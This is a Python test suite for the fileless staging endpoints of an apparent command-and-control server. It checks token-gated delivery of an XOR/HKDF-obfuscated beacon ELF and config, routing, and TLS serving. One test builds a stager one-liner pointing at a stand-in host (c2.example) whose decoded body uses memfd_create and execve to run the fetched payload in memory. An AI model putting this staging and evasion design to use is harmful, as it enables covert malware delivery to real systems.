"""
Tests for diskless staging endpoints (Contract: fileless staging).

BDD Scenarios:
1. Given a valid token, when staged, then the packed ELF/config decodes
   back to the original bytes (server<->stager HKDF parity)
2. Given no key material on the wire, when the response is captured,
   then it cannot be decoded without the token
3. Given a missing/wrong token, when staged, then STAGE_FORBIDDEN (fail closed)
4. Given no stage_token configured, when staged, then STAGE_FORBIDDEN
5. Given missing/non-ELF beacon, when staged, then STAGE_UNAVAILABLE
6. Given the HTTP routing, when a stage path arrives, then it reaches the handler
7. Given build_stage_oneliner, when built, then it embeds URL and token
8. Given TLS configured, when the stager connects over TLS, then it works
   end-to-end (skipped if openssl is unavailable)
"""
import base64
import importlib.util
import json
import os
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "c2"))

from c2.server import (
    C2State,
    build_stage_oneliner,
    handle_request,
    handle_stage,
    stage_decode,
    stage_encode,
    stage_keys,
    STAGE_HKDF_SALT,
)

# Load the stager payload module for parity checks
_spec = importlib.util.spec_from_file_location(
    "stage_payload", ROOT / "c2" / "stage_payload.py"
)
stage_payload = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(stage_payload)


def make_state(tmpdir, token="s3cret", beacon=None):
    cfg = {
        "log_dir": str(Path(tmpdir) / "logs"),
        "upload_dir": str(Path(tmpdir) / "uploads"),
        "uri": "/api/poll/",
        "report_uri": "/report/",
        "stage_token": token,
        "stage_beacon_path": beacon,
    }
    return C2State(cfg)


class TestStageCodec:
    def test_encode_decode_roundtrip(self):
        payload = b"\x7fELF" + os.urandom(500)
        assert stage_decode(stage_encode(payload, "s3cret"), "s3cret") == payload

    def test_no_key_material_on_wire(self):
        """Given a captured response, when decoded without the token, then fail."""
        payload = b"\x7fELF" + os.urandom(500)
        packed = stage_encode(payload, "s3cret")
        assert b"." not in packed  # no keys line
        assert stage_decode(packed, "wrong-token") != payload

    def test_keys_derived_deterministically_from_token(self):
        k1 = stage_keys("s3cret")
        k2 = stage_keys("s3cret")
        assert k1 == k2
        assert len(k1) == 3 and all(len(k) == 32 for k in k1)

    def test_server_payload_hkdf_parity(self):
        """Server encode must be exactly what the stager payload decodes."""
        payload = b"\x7fELF" + os.urandom(500)
        packed = stage_encode(payload, "s3cret")
        assert stage_payload._fetch_and_decode.__name__ == "_fetch_and_decode"
        # Replicate the payload's decode path against the packed body
        blob = base64.b64decode(packed.strip())
        ikm = "s3cret".encode()
        for info in reversed(stage_payload.HKDF_INFOS):
            key = stage_payload.hkdf_sha256(ikm, stage_payload.HKDF_SALT, info)
            blob = bytes(v ^ key[i % len(key)] for i, v in enumerate(blob))
        assert blob == payload
        # And the pure-python HKDF matches the server's
        assert stage_payload.hkdf_sha256(b"ikm", STAGE_HKDF_SALT, b"stage-l1") == stage_keys(
            "ikm"
        )[0]


class TestStageToken:
    def test_missing_token_forbidden(self, tmp_path):
        state = make_state(tmp_path)
        assert handle_stage(state, "beacon", "") == b"STAGE_FORBIDDEN\r\n"

    def test_wrong_token_forbidden(self, tmp_path):
        state = make_state(tmp_path, token="right")
        assert handle_stage(state, "beacon", "wrong") == b"STAGE_FORBIDDEN\r\n"

    def test_no_token_configured_fails_closed(self, tmp_path):
        state = make_state(tmp_path, token="")
        assert handle_stage(state, "beacon", "anything") == b"STAGE_FORBIDDEN\r\n"

    def test_unknown_kind_forbidden(self, tmp_path):
        state = make_state(tmp_path)
        assert handle_stage(state, "other", "s3cret") == b"STAGE_FORBIDDEN\r\n"


class TestStageBeacon:
    def test_beacon_roundtrip(self, tmp_path):
        elf = b"\x7fELF" + os.urandom(300)
        beacon = tmp_path / "beacon"
        beacon.write_bytes(elf)
        state = make_state(tmp_path, beacon=str(beacon))
        resp = handle_stage(state, "beacon", "s3cret")
        assert stage_decode(resp, "s3cret") == elf

    def test_beacon_file_missing(self, tmp_path):
        state = make_state(tmp_path, beacon=str(tmp_path / "nope"))
        assert handle_stage(state, "beacon", "s3cret") == b"STAGE_UNAVAILABLE\r\n"

    def test_beacon_not_elf(self, tmp_path):
        bad = tmp_path / "bad"
        bad.write_bytes(b"MZ not an elf")
        state = make_state(tmp_path, beacon=str(bad))
        assert handle_stage(state, "beacon", "s3cret") == b"STAGE_UNAVAILABLE\r\n"

    def test_beacon_path_none(self, tmp_path):
        state = make_state(tmp_path, beacon=None)
        assert handle_stage(state, "beacon", "s3cret") == b"STAGE_UNAVAILABLE\r\n"


class TestStageConfig:
    def test_config_roundtrip(self, tmp_path, monkeypatch):
        conf = tmp_path / "config.json"
        conf.write_text('{"c2": {"url": "https://c2.example:7070"}}')
        monkeypatch.setenv("BSB_CONFIG", str(conf))
        state = make_state(tmp_path)
        resp = handle_stage(state, "config", "s3cret")
        decoded = json.loads(stage_decode(resp, "s3cret").decode())
        # The served config is the runtime-built beacon config (full
        # defaults merged), not the raw on-disk file.
        assert decoded["c2"]["url"] == "http://127.0.0.1:7070" or "url" in decoded["c2"]
        assert "crypto" in decoded and "server" not in decoded

    def test_config_always_available(self, tmp_path, monkeypatch):
        monkeypatch.delenv("BSB_CONFIG", raising=False)
        state = make_state(tmp_path)
        resp = handle_stage(state, "config", "s3cret")
        decoded = json.loads(stage_decode(resp, "s3cret").decode())
        assert "c2" in decoded


class TestStageRouting:
    def test_http_get_beacon_routed(self, tmp_path):
        elf = b"\x7fELF" + os.urandom(64)
        beacon = tmp_path / "beacon"
        beacon.write_bytes(elf)
        state = make_state(tmp_path, beacon=str(beacon))
        raw = "GET /stage/beacon/s3cret HTTP/1.1\r\nHost: x\r\n\r\n"
        resp = handle_request(state, raw)
        assert stage_decode(resp, "s3cret") == elf

    def test_http_get_config_routed(self, tmp_path, monkeypatch):
        conf = tmp_path / "config.json"
        conf.write_text("{}")
        monkeypatch.setenv("BSB_CONFIG", str(conf))
        state = make_state(tmp_path)
        raw = "GET /stage/config/s3cret HTTP/1.1\r\nHost: x\r\n\r\n"
        decoded = json.loads(stage_decode(handle_request(state, raw), "s3cret").decode())
        assert "c2" in decoded and "server" not in decoded

    def test_wrong_token_routed_rejected(self, tmp_path):
        state = make_state(tmp_path)
        raw = "GET /stage/beacon/nope HTTP/1.1\r\nHost: x\r\n\r\n"
        assert handle_request(state, raw) == b"STAGE_FORBIDDEN\r\n"

    def test_legacy_selector_routed(self, tmp_path):
        elf = b"\x7fELF" + os.urandom(64)
        beacon = tmp_path / "beacon"
        beacon.write_bytes(elf)
        state = make_state(tmp_path, beacon=str(beacon))
        assert stage_decode(handle_request(state, "/stage/beacon/s3cret"), "s3cret") == elf


class TestStageOneliner:
    def test_oneliner_embeds_url_and_token(self, tmp_path):
        cfg = {"url": "https://c2.example:7070/", "stage_token": "s3cret"}
        oneliner = build_stage_oneliner(cfg)
        assert "BSB_STAGE_URL='https://c2.example:7070'" in oneliner
        assert "BSB_STAGE_TOKEN='s3cret'" in oneliner
        blob = oneliner.split("echo ", 1)[1].split(" |", 1)[0]
        decoded = base64.b64decode(blob).decode()
        assert "memfd_create" in decoded
        assert "execve" in decoded
        assert "hkdf_sha256" in decoded


def _self_signed_cert(td: Path):
    """Generate a self-signed cert/key pair with openssl; None if unavailable."""
    if shutil.which("openssl") is None:
        return None
    key, cert = td / "key.pem", td / "cert.pem"
    subprocess.run(
        [
            "openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
            "-keyout", str(key), "-out", str(cert), "-days", "1",
            "-subj", "/CN=localhost",
        ],
        capture_output=True,
        check=True,
    )
    return str(cert), str(key)


@pytest.mark.skipif(shutil.which("openssl") is None, reason="openssl unavailable")
class TestStageTLSEndToEnd:
    def test_tls_roundtrip(self, tmp_path, monkeypatch):
        cert_key = _self_signed_cert(tmp_path)
        assert cert_key is not None
        cert, key = cert_key
        conf = tmp_path / "config.json"
        conf.write_text('{"c2": {"url": "https://tls-stage"}}')
        monkeypatch.setenv("BSB_CONFIG", str(conf))

        elf = b"\x7fELF" + os.urandom(64)
        beacon = tmp_path / "beacon"
        beacon.write_bytes(elf)

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as probe:
            probe.bind(("127.0.0.1", 0))
            port = probe.getsockname()[1]

        import ssl
        import urllib.request

        import c2.server as srv_mod

        cfg = {
            "log_dir": str(tmp_path / "logs"),
            "upload_dir": str(tmp_path / "uploads"),
            "uri": "/api/poll/",
            "report_uri": "/report/",
            "stage_token": "s3cret",
            "stage_beacon_path": str(beacon),
            "tls_cert": cert,
            "tls_key": key,
            "host": "127.0.0.1",
            "port": str(port),
        }
        state = C2State(cfg)
        server = threading.Thread(target=srv_mod.serve, args=(cfg, state), daemon=True)
        server.start()
        time.sleep(0.5)

        ctx = ssl._create_unverified_context()
        rq = urllib.request.urlopen(
            f"https://127.0.0.1:{port}/stage/beacon/s3cret", context=ctx
        )
        blob = base64.b64decode(rq.read().strip())
        ikm = "s3cret".encode()
        for info in reversed(stage_payload.HKDF_INFOS):
            k = stage_payload.hkdf_sha256(ikm, stage_payload.HKDF_SALT, info)
            blob = bytes(v ^ k[i % len(k)] for i, v in enumerate(blob))
        assert blob == elf
